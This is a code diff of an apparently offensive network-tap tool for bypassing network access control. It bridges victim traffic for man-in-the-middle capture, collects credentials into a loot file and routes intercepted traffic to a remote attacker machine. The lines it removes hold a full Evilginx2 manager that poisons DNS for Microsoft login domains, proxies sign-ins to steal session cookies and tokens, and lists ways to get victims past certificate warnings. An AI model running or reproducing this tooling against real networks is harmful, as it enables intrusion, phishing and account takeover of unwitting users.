@@ -23,18 +23,18 @@ from urllib.parse import urlparse, parse_qs
 # ============================================================================
 
 CONFIG = {
-    'MGMT_INTERFACES': ['wlan0', 'wlan1', 'wlp', 'wifi'],
+    'MGMT_INTERFACES': ['wlan0', 'wlan1', 'wlan2', 'wlp', 'wifi'],
+    'WIFI_AP_INTERFACE': 'wlan0',  # ALWAYS management AP - required when eth interfaces are in bridge mode
+    'WIFI_CLIENT_INTERFACE': None,  # Auto-detect wlan1 or wlan2 for external communications (internet, Slack APIs)
     'BRIDGE_NAME': 'br0',
     'BRIDGE_IP': '10.200.66.1',  # IP for MITM interception
+    'BRIDGE_IP_NETWORK': '10.200.66.0/24',  # Bridge network for route prioritization
     'PCAP_DIR': '/var/log/nac-captures',
     'PIDFILE': '/var/run/auto-nac-tcpdump.pid',
     'STATEFILE': '/var/run/auto-nac-state.conf',
     'LOGFILE': '/var/log/auto-nac-bridge.log',
     'LOOT_FILE': '/var/log/nac-captures/loot.json',
     'PCREDZ_PATH': '/opt/PCredz/pcredz-wrapper.sh',
-    'EVILGINX_PATH': '/opt/evilginx2/evilginx',
-    'EVILGINX_DB': '/var/log/nac-captures/evilginx.db',
-    'EVILGINX_CONFIG': '/var/log/nac-captures/evilginx-config',
     'WEB_PORT': 8080,
     'TRANSPARENT_MODE': True,  # Bridge always active (802.1X compatible)
     'ANALYSIS_INTERVAL': 300,  # Seconds between automated loot scans
@@ -118,8 +118,73 @@ def run_cmd(cmd, check=False, timeout=None):
     except Exception:
         return None
 
+def get_interface_role(iface):
+    """Determine interface role: 'bridge', 'ap', 'client', 'eth', 'unknown'"""
+    bridge_name = CONFIG.get('BRIDGE_NAME', 'br0')
+    
+    # Bridge interface
+    if iface == bridge_name:
+        return 'bridge'
+    
+    # Bridge member interfaces (eth0, eth1)
+    if re.match(r'^(eth|enp|lan|end)[0-9]', iface):
+        # Check if it's a bridge member
+        result = run_cmd(['ip', 'link', 'show', 'master', iface], check=False)
+        if result and result.returncode == 0:
+            if bridge_name in result.stdout:
+                return 'bridge'
+        return 'eth'
+    
+    # WiFi AP interface (wlan0)
+    if iface == CONFIG.get('WIFI_AP_INTERFACE', 'wlan0'):
+        return 'ap'
+    
+    # WiFi client interface (wlan1, wlan2)
+    client_iface = CONFIG.get('WIFI_CLIENT_INTERFACE')
+    if client_iface and iface == client_iface:
+        return 'client'
+    
+    # Check if it's a wireless interface
+    if (os.path.exists(f"/sys/class/net/{iface}/wireless") or
+            os.path.exists(f"/sys/class/net/{iface}/phy80211")):
+        # If it's wlan1 or wlan2 and not the AP, it's a client interface
+        if re.match(r'^wlan[12]$', iface):
+            return 'client'
+        # Default to client for other wireless interfaces
+        return 'client'
+    
+    return 'unknown'
+
+def detect_wifi_client_interface():
+    """Auto-detect wlan1 or wlan2 for client mode (prefer wlan1, fallback to wlan2)"""
+    ap_interface = CONFIG.get('WIFI_AP_INTERFACE', 'wlan0')
+    
+    # Try wlan1 first
+    for candidate in ['wlan1', 'wlan2']:
+        if candidate == ap_interface:
+            continue
+        
+        # Check if interface exists
+        result = run_cmd(['ip', 'link', 'show', candidate], check=False)
+        if result and result.returncode == 0:
+            # Check if it's wireless
+            if (os.path.exists(f"/sys/class/net/{candidate}/wireless") or
+                    os.path.exists(f"/sys/class/net/{candidate}/phy80211")):
+                log(f"Detected WiFi client interface: {candidate}", 'INFO')
+                CONFIG['WIFI_CLIENT_INTERFACE'] = candidate
+                return candidate
+    
+    log("No WiFi client interface detected (wlan1 or wlan2)", 'WARNING')
+    return None
+
 def is_mgmt_interface(iface):
-    """Check if interface is management/wireless"""
+    """Check if interface is management/wireless (excludes bridge interfaces)"""
+    # Exclude bridge and bridge members
+    role = get_interface_role(iface)
+    if role in ['bridge', 'eth']:
+        return False
+    
+    # Check if it's a wireless interface
     for mgmt in CONFIG['MGMT_INTERFACES']:
         if iface.startswith(mgmt):
             return True
@@ -493,7 +558,7 @@ class MITMManager:
         log("All intercept rules removed")
 
     def setup_remote_routing(self, remote_ip):
-        """Setup routing for remote attacker VM via WiFi"""
+        """Setup routing for remote attacker VM via client WiFi (not AP)"""
         if not remote_ip:
             return False
         
@@ -501,20 +566,63 @@ class MITMManager:
             log(f"Setting up routing to remote attacker: {remote_ip}")
             
             bridge = CONFIG['BRIDGE_NAME']
+            ap_interface = CONFIG.get('WIFI_AP_INTERFACE', 'wlan0')
+            client_interface = CONFIG.get('WIFI_CLIENT_INTERFACE')
             
-            # Enable forwarding between bridge and wlan0
-            run_cmd(['iptables', '-A', 'FORWARD', '-i', bridge, '-o', 'wlan0', '-j', 'ACCEPT'])
-            run_cmd(['iptables', '-A', 'FORWARD', '-i', 'wlan0', '-o', bridge, '-j', 'ACCEPT'])
+            # Use client interface, not AP interface
+            if not client_interface:
+                client_interface = detect_wifi_client_interface()
+                if not client_interface:
+                    log("No client WiFi interface available for remote routing", 'ERROR')
+                    return False
+            
+            # Validate we're not using the AP interface
+            if client_interface == ap_interface:
+                log(f"ERROR: Cannot use AP interface ({ap_interface}) for remote routing", 'ERROR')
+                log("AP interface is reserved for management only", 'ERROR')
+                return False
+            
+            # Verify interface is in client mode (not AP)
+            result = run_cmd(['ip', 'link', 'show', client_interface], check=False)
+            if not result or result.returncode != 0:
+                log(f"Client interface {client_interface} not available", 'ERROR')
+                return False
+            
+            log(f"Using client interface {client_interface} for remote routing (not AP {ap_interface})", 'INFO')
+            
+            # Get client interface IP (should be assigned via DHCP when connected)
+            result = run_cmd(['ip', 'addr', 'show', client_interface])
+            client_ip = None
+            if result:
+                ip_match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/\d+', result.stdout)
+                if ip_match:
+                    client_ip = ip_match.group(1)
+                    log(f"Client interface IP: {client_ip}", 'INFO')
+                else:
+                    log(f"WARNING: Client interface {client_interface} has no IP address", 'WARNING')
+                    log("Interface should be connected to an AP first", 'WARNING')
+            
+            # Enable forwarding between bridge and client WLAN
+            run_cmd(['iptables', '-A', 'FORWARD', '-i', bridge, '-o', client_interface, '-j', 'ACCEPT'])
+            run_cmd(['iptables', '-A', 'FORWARD', '-i', client_interface, '-o', bridge, '-j', 'ACCEPT'])
             
             # SNAT for packets going to remote VM
+            # Use client interface IP if available, otherwise use a fallback
+            if client_ip:
+                snat_ip = client_ip
+            else:
+                # Fallback: use first IP in client network (this is a guess, should be improved)
+                snat_ip = '172.31.250.1'  # This should be the client interface's actual IP
+                log(f"Using fallback SNAT IP: {snat_ip} (client interface should have an IP)", 'WARNING')
+            
             run_cmd([
                 'iptables', '-t', 'nat', '-A', 'POSTROUTING',
-                '-o', 'wlan0', '-d', remote_ip,
-                '-j', 'SNAT', '--to-source', '172.31.250.1'
+                '-o', client_interface, '-d', remote_ip,
+                '-j', 'SNAT', '--to-source', snat_ip
             ])
             
             CONFIG['REMOTE_ATTACKER_IP'] = remote_ip
-            log(f"Remote routing configured to {remote_ip}", 'SUCCESS')
+            log(f"Remote routing configured to {remote_ip} via {client_interface}", 'SUCCESS')
             return True
             
         except Exception as e:
@@ -541,10 +649,17 @@ class MITMManager:
         if self.victim_mac:
             run_cmd(['ebtables', '-t', 'nat', '-F', 'POSTROUTING'])
         
-        # Remove forwarding rules
+        # Remove forwarding rules (use client interface, not hardcoded wlan0)
+        client_interface = CONFIG.get('WIFI_CLIENT_INTERFACE')
         if CONFIG['REMOTE_ATTACKER_IP']:
-            run_cmd(['iptables', '-D', 'FORWARD', '-i', bridge, '-o', 'wlan0', '-j', 'ACCEPT'])
-            run_cmd(['iptables', '-D', 'FORWARD', '-i', 'wlan0', '-o', bridge, '-j', 'ACCEPT'])
+            if client_interface:
+                run_cmd(['iptables', '-D', 'FORWARD', '-i', bridge, '-o', client_interface, '-j', 'ACCEPT'], check=False)
+                run_cmd(['iptables', '-D', 'FORWARD', '-i', client_interface, '-o', bridge, '-j', 'ACCEPT'], check=False)
+            else:
+                # Fallback: try wlan1 and wlan2
+                for iface in ['wlan1', 'wlan2']:
+                    run_cmd(['iptables', '-D', 'FORWARD', '-i', bridge, '-o', iface, '-j', 'ACCEPT'], check=False)
+                    run_cmd(['iptables', '-D', 'FORWARD', '-i', iface, '-o', bridge, '-j', 'ACCEPT'], check=False)
         
         # Reset state
         self.enabled = False
@@ -570,717 +685,377 @@ class MITMManager:
         }
 
 # ============================================================================
-# EVILGINX2 MANAGER
+# NETWORK ROUTE MANAGER
 # ============================================================================
 
-class EvilginxManager:
-    """Manages Evilginx2 for OAuth token and cookie capture"""
-
-    def __init__(self):
-        self.evilginx_path = CONFIG['EVILGINX_PATH']
-        self.db_path = CONFIG['EVILGINX_DB']
-        self.config_dir = CONFIG['EVILGINX_CONFIG']
-        self.process = None
-        self.dnsmasq_process = None
-        self.running = False
-        self.bridge_ip = CONFIG['BRIDGE_IP']
-        self.phishlet = None
-        self.lure_url = None
-        self.domains_to_poison = []
-        self.sessions = []
-        self.monitor_thread = None
-        self.log_monitor_thread = None
-        self.stop_monitoring = False
-        self.log_file = '/tmp/evilginx.log'
-        self.mode = 'transparent'  # 'transparent' or 'phishing'
-        self.custom_domain = None  # User's phishing domain
-
-    def check_installation(self):
-        """Check if Evilginx2 is installed"""
-        return os.path.exists(self.evilginx_path)
-
-    def setup_config(self, phishlet='o365', domain=None):
-        """Setup Evilginx2 configuration"""
-        try:
-            os.makedirs(self.config_dir, exist_ok=True)
-            
-            # Create config file
-            config_file = os.path.join(self.config_dir, 'config.yaml')
-            
-            if not domain:
-                domain = f'{phishlet}.local'
-            
-            config_content = f"""# Evilginx2 Config - NAC Tap Integration
-phishlets:
-  - name: {phishlet}
-    enabled: true
-    hostname: {domain}
+class NetworkRouteManager:
+    """Manages route table to prevent conflicts between bridge, AP, and client WLAN"""
     
-server:
-  bind_ip: {self.bridge_ip}
-  http_port: 80
-  https_port: 443
-  
-redirect_url: https://www.microsoft.com
-"""
-            
-            with open(config_file, 'w') as f:
-                f.write(config_content)
-            
-            log(f"Evilginx config created: {config_file}")
-            return True
-            
-        except Exception as e:
-            log(f"Config setup failed: {e}", 'ERROR')
-            return False
-
-    def start(self, phishlet='o365', domain=None, mode='transparent'):
-        """Start Evilginx2 process
+    def __init__(self):
+        self.bridge_name = CONFIG.get('BRIDGE_NAME', 'br0')
+        self.bridge_network = CONFIG.get('BRIDGE_IP_NETWORK', '10.200.66.0/24')
+        self.ap_interface = CONFIG.get('WIFI_AP_INTERFACE', 'wlan0')
+        self.ap_network = '172.31.250.0/24'  # AP network from setup-wifi-ap.sh
         
-        Args:
-            phishlet: The phishlet to use (o365, outlook, etc.)
-            domain: Custom domain for phishing mode (optional)
-            mode: 'transparent' (DNS poisoning to bridge IP) or 'phishing' (redirect to custom domain)
-        """
-        if self.running and self.process and self.process.poll() is None:
-            log("Evilginx2 already running", 'WARNING')
-            return True
-
-        if not self.check_installation():
-            log("Evilginx2 not found - please install first", 'ERROR')
-            return False
-
+        # Route priorities (lower metric = higher priority)
+        self.route_metrics = {
+            'bridge': 100,      # Highest priority - bridge network
+            'ap': 200,          # AP network
+            'client': 300,      # Client WLAN network
+            'default': 400      # Default route (lowest priority)
+        }
+    
+    def ensure_route_priority(self, network, interface, metric):
+        """Ensure route exists with specific priority/metric"""
         try:
-            self.mode = mode
-            log(f"Starting Evilginx2 with {phishlet} phishlet in {mode} mode...")
+            # Check if route exists
+            result = run_cmd(['ip', 'route', 'show', network], check=False)
             
-            # Determine target domain based on mode
-            if mode == 'phishing' and domain:
-                # PHISHING MODE: User provides their own domain with valid SSL cert
-                # Example: user owns "micr0soft-login.com" with Let's Encrypt cert
-                log(f"PHISHING MODE: Using custom domain: {domain}", 'INFO')
-                log("Victim will see YOUR domain in browser (not transparent!)", 'WARNING')
-                self.custom_domain = domain
-                self.domains_to_poison = []  # Don't poison Microsoft domains
-                target_domain = domain
-                
-            else:
-                # TRANSPARENT MODE: Use real Microsoft domains (DNS poisoning)
-                log("TRANSPARENT MODE: Using real Microsoft domains", 'INFO')
-                log("Requires SSL certificate bypass on victim device!", 'WARNING')
-                self.mode = 'transparent'
-                
-                if not domain:
-                    if phishlet == 'o365':
-                        target_domain = 'login.microsoftonline.com'
-                        # Poison multiple Microsoft auth domains
-                        self.domains_to_poison = [
-                            'login.microsoftonline.com',
-                            'account.microsoft.com',
-                            'login.microsoft.com',
-                            'portal.office.com'
-                        ]
-                    elif phishlet == 'outlook':
-                        target_domain = 'login.live.com'
-                        self.domains_to_poison = [
-                            'login.live.com',
-                            'account.live.com',
-                            'outlook.live.com'
-                        ]
-                    else:
-                        target_domain = f'{phishlet}.local'
-                        self.domains_to_poison = [target_domain]
+            if result and result.returncode == 0 and network in result.stdout:
+                # Route exists - check if it has the right metric
+                if f'metric {metric}' in result.stdout:
+                    log(f"Route {network} via {interface} already has metric {metric}", 'INFO')
+                    return True
                 else:
-                    target_domain = domain
-                    self.domains_to_poison = [domain]
+                    # Remove existing route and add with correct metric
+                    log(f"Updating route {network} to use metric {metric}", 'INFO')
+                    run_cmd(['ip', 'route', 'del', network], check=False)
             
-            self.phishlet = phishlet
-            
-            # Find phishlets directory dynamically
-            phishlet_dirs = [
-                '/opt/evilginx2/phishlets',
-                os.path.join(os.path.dirname(self.evilginx_path), 'phishlets')
-            ]
-            
-            phishlet_dir = None
-            for pdir in phishlet_dirs:
-                if os.path.exists(pdir):
-                    phishlet_dir = pdir
-                    log(f"Found phishlets at: {pdir}")
-                    break
-            
-            if not phishlet_dir:
-                log("Phishlets directory not found", 'ERROR')
-                return False
-            
-            # Verify phishlet exists
-            phishlet_file = os.path.join(phishlet_dir, f'{phishlet}.yaml')
-            if not os.path.exists(phishlet_file):
-                log(f"Phishlet not found: {phishlet_file}", 'ERROR')
-                log(f"Available phishlets: {os.listdir(phishlet_dir) if os.path.exists(phishlet_dir) else 'N/A'}")
-                return False
-            
-            # Create config directory
-            os.makedirs(self.config_dir, exist_ok=True)
-            
-            # Start Evilginx2
-            log_file = os.path.join(CONFIG['PCAP_DIR'], 'evilginx.log')
-            
-            # Evilginx3+ uses different flags (no -d for database)
-            # Database is stored in ~/.evilginx by default
-            cmd = [
-                self.evilginx_path,
-                '-p', phishlet_dir
-            ]
-            
-            log(f"Starting: {' '.join(cmd)}")
-            
-            self.process = subprocess.Popen(
-                cmd,
-                stdin=subprocess.PIPE,
-                stdout=open(log_file, 'a'),
-                stderr=subprocess.STDOUT,
-                cwd=self.config_dir,
-                preexec_fn=os.setpgrp
-            )
-            
-            # Configuration commands based on mode
-            if self.mode == 'phishing':
-                # Phishing mode: Use custom domain, no DNS poisoning needed
-                cmd_sequence = f"""config domain {target_domain}
-config ip {self.bridge_ip}
-phishlets hostname {phishlet} {target_domain}
-phishlets enable {phishlet}
-lures create {phishlet}
-lures get-url 0
-"""
+            # Add route with metric
+            if '/' in network:
+                # Network route
+                run_cmd(['ip', 'route', 'add', network, 'dev', interface, 'metric', str(metric)], check=False)
             else:
-                # Transparent mode: Use real domain, DNS poisoning required
-                cmd_sequence = f"""config domain {target_domain}
-config ip {self.bridge_ip}
-phishlets hostname {phishlet} {target_domain}
-phishlets enable {phishlet}
-"""
+                # Default route
+                result = run_cmd(['ip', 'route', 'show', 'default'], check=False)
+                if result and 'via' in result.stdout:
+                    # Extract gateway
+                    gw_match = re.search(r'via (\S+)', result.stdout)
+                    if gw_match:
+                        gateway = gw_match.group(1)
+                        run_cmd(['ip', 'route', 'add', 'default', 'via', gateway, 'dev', interface, 'metric', str(metric)], check=False)
+                    else:
+                        run_cmd(['ip', 'route', 'add', 'default', 'dev', interface, 'metric', str(metric)], check=False)
+                else:
+                    run_cmd(['ip', 'route', 'add', 'default', 'dev', interface, 'metric', str(metric)], check=False)
             
-            log("=" * 60)
-            log(f"EVILGINX CONFIGURATION ({self.mode.upper()} MODE):", 'INFO')
-            log(f"  Target Domain: {target_domain}", 'INFO')
-            log(f"  Bridge IP: {self.bridge_ip}", 'INFO')
-            log(f"  Phishlet: {phishlet}", 'INFO')
-            log(f"  Mode: {self.mode}", 'INFO')
-            if self.mode == 'phishing':
-                log(f"  Custom Domain: {self.custom_domain}", 'INFO')
-                log(f"  Note: Victim will see {self.custom_domain} in browser!", 'WARNING')
-            log(f"  Commands to send:", 'INFO')
-            for line in cmd_sequence.strip().split('\n'):
-                log(f"    > {line}", 'INFO')
-            log("=" * 60)
+            log(f"Route {network} via {interface} with metric {metric} configured", 'SUCCESS')
+            return True
             
-            # Send configuration commands
-            time.sleep(2)
-            if self.process.poll() is None:
-                try:
-                    self.process.stdin.write(cmd_sequence.encode())
-                    self.process.stdin.flush()
-                    log("Configuration commands sent to Evilginx", 'SUCCESS')
-                    
-                    # Wait for Evilginx to process commands
-                    time.sleep(2)
-                    
-                    # Send additional verification command
-                    self.process.stdin.write(b"phishlets\n")
-                    self.process.stdin.flush()
-                    log("Requested phishlet status verification")
-                    
-                except Exception as e:
-                    log(f"Failed to send commands: {e}", 'ERROR')
-                    import traceback
-                    log(traceback.format_exc(), 'ERROR')
-            
-            time.sleep(3)
-            
-            # Verify it's running
-            if self.process.poll() is None:
-                self.running = True
-                self.lure_url = f"http://{domain}"
-                
-                # Setup automatic DNS poisoning
-                if not self.setup_dns_poisoning():
-                    log("WARNING: DNS poisoning setup failed - manual configuration needed", 'WARNING')
-                
-                # Start session monitoring
-                self.stop_monitoring = False
-                self.monitor_thread = threading.Thread(target=self._monitor_sessions, daemon=True)
-                self.monitor_thread.start()
-                
-                # Start log monitoring for real-time attack visibility
-                self.log_monitor_thread = threading.Thread(target=self._monitor_logs, daemon=True)
-                self.log_monitor_thread.start()
-                
-                log("=" * 60, 'SUCCESS')
-                log("EVILGINX2 STARTED SUCCESSFULLY!", 'SUCCESS')
-                log("=" * 60, 'SUCCESS')
-                log(f"Process ID: {self.process.pid}", 'INFO')
-                log(f"Phishlet: {phishlet}", 'INFO')
-                log(f"Primary domain: {domain}", 'INFO')
-                log(f"Bridge IP: {self.bridge_ip}", 'INFO')
-                log(f"Listening on: https://{self.bridge_ip}:443 and http://{self.bridge_ip}:80", 'INFO')
-                log(f"Database: {self.db_path}", 'INFO')
-                log(f"Config dir: {self.config_dir}", 'INFO')
-                log(f"Log file: /var/log/nac-captures/evilginx.log", 'INFO')
-                log("")
-                log("DNS POISONING ACTIVE:", 'SUCCESS')
-                log("  Intercepting DNS queries for:")
-                for d in self.domains_to_poison:
-                    log(f"    - {d} -> {self.bridge_ip}")
-                log("")
-                log("ATTACK FLOW:", 'INFO')
-                log(f"  1. Victim queries {domain} -> DNS returns {self.bridge_ip}", 'INFO')
-                log(f"  2. Victim connects to https://{self.bridge_ip}", 'INFO')
-                log(f"  3. Evilginx proxies to real {domain}", 'INFO')
-                log(f"  4. Sessions captured to database", 'INFO')
-                log("")
-                log("SSL CERTIFICATE WARNING:", 'WARNING')
-                log("  Victim will see SSL certificate warning!", 'WARNING')
-                log("  Modern browsers will block self-signed certificates", 'WARNING')
-                log("")
-                log("TO BYPASS SSL WARNING (for testing):", 'INFO')
-                log("  Option 1: Click 'Advanced' -> 'Proceed Anyway' in browser", 'INFO')
-                log("  Option 2: Use Firefox with security.enterprise_roots.enabled=true", 'INFO')
-                log("  Option 3: Install Evilginx CA cert on victim device", 'INFO')
-                log(f"  Option 4: Check {self.config_dir} for certificate files", 'INFO')
-                log("")
-                log("Session monitoring started - checking every 5s", 'SUCCESS')
-                log("Real-time activity monitoring enabled", 'SUCCESS')
-                log("=" * 60, 'SUCCESS')
-                return True
-            else:
-                log("Evilginx2 failed to start - check logs", 'ERROR')
-                log(f"Log file: {log_file}")
-                return False
-
         except Exception as e:
-            log(f"Evilginx2 start failed: {e}", 'ERROR')
+            log(f"Failed to set route priority: {e}", 'WARNING')
+            return False
+    
+    def remove_conflicting_routes(self, interface):
+        """Remove routes that conflict with the specified interface"""
+        try:
+            log(f"Removing conflicting routes for {interface}...", 'INFO')
+            
+            # Get all routes
+            result = run_cmd(['ip', 'route', 'show'])
+            if not result:
+                return False
+            
+            routes_to_remove = []
+            for line in result.stdout.split('\n'):
+                if not line.strip():
+                    continue
+                
+                # Check if this route uses a different interface but same network
+                if 'default' in line:
+                    # Check default routes
+                    if interface not in line and 'default' in line:
+                        # Another default route exists
+                        routes_to_remove.append('default')
+                elif interface not in line:
+                    # Check if it's a network route that might conflict
+                    parts = line.split()
+                    if len(parts) > 0:
+                        network = parts[0]
+                        if '/' in network and network not in [self.bridge_network, self.ap_network]:
+                            # Check if this network should use our interface
+                            # For now, only remove if it's clearly wrong
+                            pass
+            
+            # Remove conflicting default routes
+            for route in set(routes_to_remove):
+                run_cmd(['ip', 'route', 'del', route], check=False)
+                log(f"Removed conflicting route: {route}", 'INFO')
+            
+            return True
+            
+        except Exception as e:
+            log(f"Failed to remove conflicting routes: {e}", 'WARNING')
+            return False
+    
+    def get_route_table(self):
+        """Get current route table for debugging"""
+        try:
+            result = run_cmd(['ip', 'route', 'show'])
+            if result:
+                return result.stdout
+            return ""
+        except Exception as e:
+            log(f"Failed to get route table: {e}", 'WARNING')
+            return ""
+    
+    def validate_routing(self):
+        """Check for routing conflicts"""
+        try:
+            conflicts = []
+            
+            # Get route table
+            route_table = self.get_route_table()
+            
+            # Check for multiple default routes
+            default_routes = [line for line in route_table.split('\n') if 'default' in line]
+            if len(default_routes) > 1:
+                conflicts.append(f"Multiple default routes detected: {len(default_routes)}")
+            
+            # Check bridge network route
+            if self.bridge_network not in route_table:
+                log(f"WARNING: Bridge network route ({self.bridge_network}) not found", 'WARNING')
+            
+            # Check AP network route
+            if self.ap_network not in route_table:
+                log(f"INFO: AP network route ({self.ap_network}) not found (may be OK)", 'INFO')
+            
+            if conflicts:
+                log("Routing conflicts detected:", 'WARNING')
+                for conflict in conflicts:
+                    log(f"  - {conflict}", 'WARNING')
+                return False
+            
+            log("No routing conflicts detected", 'SUCCESS')
+            return True
+            
+        except Exception as e:
+            log(f"Routing validation failed: {e}", 'WARNING')
+            return False
+    
+    def setup_route_priorities(self, client_interface, client_gateway):
+        """Setup route priorities to prevent conflicts"""
+        try:
+            log("Setting up route priorities to prevent conflicts...", 'INFO')
+            
+            # Remove conflicting routes first
+            self.remove_conflicting_routes(client_interface)
+            
+            # Get client network (from client interface IP)
+            result = run_cmd(['ip', 'addr', 'show', client_interface])
+            client_network = None
+            if result:
+                ip_match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/(\d+)', result.stdout)
+                if ip_match:
+                    ip = ip_match.group(1)
+                    prefix = ip_match.group(2)
+                    # Calculate network (simplified - assumes /24)
+                    if prefix == '24':
+                        parts = ip.split('.')
+                        client_network = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
+            
+            # Setup routes with priorities (lower metric = higher priority)
+            # 1. Bridge network (highest priority)
+            self.ensure_route_priority(self.bridge_network, self.bridge_name, self.route_metrics['bridge'])
+            
+            # 2. AP network
+            self.ensure_route_priority(self.ap_network, self.ap_interface, self.route_metrics['ap'])
+            
+            # 3. Client WLAN network (if detected)
+            if client_network:
+                self.ensure_route_priority(client_network, client_interface, self.route_metrics['client'])
+            
+            # 4. Default route via client WLAN (lowest priority)
+            if client_gateway:
+                # Remove existing default routes
+                result = run_cmd(['ip', 'route', 'show', 'default'])
+                if result and result.stdout:
+                    for line in result.stdout.split('\n'):
+                        if 'default' in line and client_interface not in line:
+                            run_cmd(['ip', 'route', 'del', 'default'], check=False)
+                
+                # Add default route with metric
+                run_cmd(['ip', 'route', 'add', 'default', 'via', client_gateway, 'dev', client_interface, 'metric', str(self.route_metrics['default'])], check=False)
+                log(f"Default route via {client_gateway} on {client_interface} with metric {self.route_metrics['default']}", 'SUCCESS')
+            
+            # Validate routing
+            self.validate_routing()
+            
+            # Log route table
+            route_table = self.get_route_table()
+            log("Current route table:", 'INFO')
+            for line in route_table.split('\n')[:20]:  # First 20 lines
+                if line.strip():
+                    log(f"  {line}", 'INFO')
+            
+            return True
+            
+        except Exception as e:
+            log(f"Route priority setup failed: {e}", 'ERROR')
             import traceback
             log(traceback.format_exc(), 'ERROR')
             return False
 
-    def setup_dns_poisoning(self):
-        """Setup automatic DNS poisoning for Microsoft domains"""
+# ============================================================================
+# DNS MANAGER
+# ============================================================================
+
+class DNSManager:
+    """Manages DNS configuration to prevent conflicts between AP and client WLAN"""
+    
+    def __init__(self):
+        self.ap_interface = CONFIG.get('WIFI_AP_INTERFACE', 'wlan0')
+        self.ap_ip = '172.31.250.1'  # AP IP from setup-wifi-ap.sh
+        self.client_dns_servers = []
+    
+    def prevent_dnsmasq_conflicts(self):
+        """Ensure dnsmasq only listens on AP interface"""
         try:
-            log("Setting up automatic DNS poisoning...")
+            log("Checking dnsmasq configuration for conflicts...", 'INFO')
             
-            # Create dnsmasq config for poisoning with query logging
-            dnsmasq_conf = f"/tmp/evilginx-dnsmasq.conf"
-            dnsmasq_log = f"/tmp/evilginx-dnsmasq.log"
-            
-            with open(dnsmasq_conf, 'w') as f:
-                f.write(f"# Evilginx DNS Poisoning\n")
-                f.write(f"interface={CONFIG['BRIDGE_NAME']}\n")
-                f.write(f"bind-interfaces\n")
-                f.write(f"listen-address={self.bridge_ip}\n")
-                f.write(f"port=5353\n")  # Use non-standard port, redirect with iptables
-                f.write(f"log-queries\n")
-                f.write(f"log-facility={dnsmasq_log}\n")
-                f.write(f"\n")
+            # Check if dnsmasq is running
+            result = run_cmd(['systemctl', 'is-active', 'dnsmasq'], check=False)
+            if result and result.returncode == 0:
+                log("dnsmasq is active", 'INFO')
                 
-                # Poison Microsoft domains
-                for domain in self.domains_to_poison:
-                    f.write(f"address=/{domain}/{self.bridge_ip}\n")
-                
-                # Pass through all other queries
-                f.write(f"\n# Upstream DNS\n")
-                f.write(f"server=8.8.8.8\n")
-                f.write(f"server=1.1.1.1\n")
-            
-            log(f"DNS config created: {dnsmasq_conf}")
-            
-            # Kill any existing dnsmasq for evilginx
-            run_cmd(['pkill', '-f', 'dnsmasq.*evilginx'])
-            time.sleep(1)
-            
-            # Start dnsmasq with logging
-            self.dnsmasq_process = subprocess.Popen(
-                ['dnsmasq', '-C', dnsmasq_conf, '--no-daemon', '--log-queries'],
-                stdout=subprocess.PIPE,
-                stderr=subprocess.STDOUT,
-                preexec_fn=os.setpgrp
-            )
-            
-            # Start DNS log monitor
-            threading.Thread(target=self._monitor_dns_logs, daemon=True).start()
-            
-            time.sleep(1)
-            
-            if self.dnsmasq_process.poll() is None:
-                log(f"DNS server started (PID: {self.dnsmasq_process.pid})")
+                # Check dnsmasq config
+                dnsmasq_conf = '/etc/dnsmasq.conf'
+                if os.path.exists(dnsmasq_conf):
+                    with open(dnsmasq_conf, 'r') as f:
+                        config = f.read()
+                    
+                    # Verify it's only listening on AP interface
+                    if f'interface={self.ap_interface}' in config:
+                        log(f"dnsmasq correctly configured for AP interface ({self.ap_interface})", 'SUCCESS')
+                    else:
+                        log(f"WARNING: dnsmasq may not be restricted to AP interface", 'WARNING')
+                        log("dnsmasq should only listen on AP interface to avoid conflicts", 'WARNING')
+                else:
+                    log("dnsmasq config file not found", 'WARNING')
             else:
-                log("DNS server failed to start", 'WARNING')
+                log("dnsmasq is not active (this is OK if AP is not set up)", 'INFO')
+            
+            return True
+        except Exception as e:
+            log(f"DNS conflict check failed: {e}", 'WARNING')
+            return False
+    
+    def configure_ap_dns(self):
+        """Configure DNS for AP interface - use AP IP for local, external for internet"""
+        try:
+            log("Configuring DNS for AP interface...", 'INFO')
+            
+            # For AP interface, use AP IP for local queries, external DNS for internet
+            # This prevents conflicts with dnsmasq running on AP
+            ap_dns_servers = [self.ap_ip, '8.8.8.8', '1.1.1.1']
+            
+            # Try systemd-resolved first
+            result = run_cmd(['systemctl', 'is-active', 'systemd-resolved'], check=False)
+            if result and result.returncode == 0:
+                # Configure DNS for AP interface
+                for dns in ap_dns_servers:
+                    run_cmd(['resolvectl', 'dns', self.ap_interface, dns], check=False)
+                log(f"AP DNS configured via systemd-resolved: {ap_dns_servers}", 'SUCCESS')
+                return True
+            
+            # Fallback: Update resolv.conf (but this affects all interfaces)
+            log("Using resolv.conf fallback for AP DNS (may affect other interfaces)", 'WARNING')
+            return False
+            
+        except Exception as e:
+            log(f"AP DNS configuration failed: {e}", 'WARNING')
+            return False
+    
+    def configure_client_dns(self, interface, dns_servers):
+        """Configure DNS for client WLAN interface - use external DNS servers"""
+        try:
+            log(f"Configuring DNS for client interface {interface}...", 'INFO')
+            
+            # For client interface, use external DNS servers (not AP IP)
+            # Filter out AP IP if present
+            filtered_dns = [dns for dns in dns_servers if dns != self.ap_ip]
+            
+            if not filtered_dns:
+                # Use public DNS if no valid servers
+                filtered_dns = ['8.8.8.8', '1.1.1.1']
+                log("No valid DNS servers, using public DNS", 'INFO')
+            
+            self.client_dns_servers = filtered_dns
+            
+            # Try systemd-resolved first
+            result = run_cmd(['systemctl', 'is-active', 'systemd-resolved'], check=False)
+            if result and result.returncode == 0:
+                # Configure DNS for client interface
+                for dns in filtered_dns:
+                    run_cmd(['resolvectl', 'dns', interface, dns], check=False)
+                log(f"Client DNS configured via systemd-resolved: {filtered_dns}", 'SUCCESS')
+                return True
+            
+            # Fallback: Update resolv.conf directly
+            try:
+                # Backup existing resolv.conf
+                if os.path.exists('/etc/resolv.conf'):
+                    run_cmd(['cp', '/etc/resolv.conf', '/etc/resolv.conf.bak'], check=False)
+                
+                # Write new resolv.conf
+                with open('/etc/resolv.conf', 'w') as f:
+                    f.write("# DNS configured by NAC-Tap (Client WLAN)\n")
+                    for dns in filtered_dns:
+                        f.write(f"nameserver {dns}\n")
+                    f.write("options timeout:2 attempts:3\n")
+                
+                log(f"Client DNS configured via resolv.conf: {filtered_dns}", 'SUCCESS')
+                return True
+            except Exception as e:
+                log(f"Failed to configure DNS via resolv.conf: {e}", 'WARNING')
                 return False
             
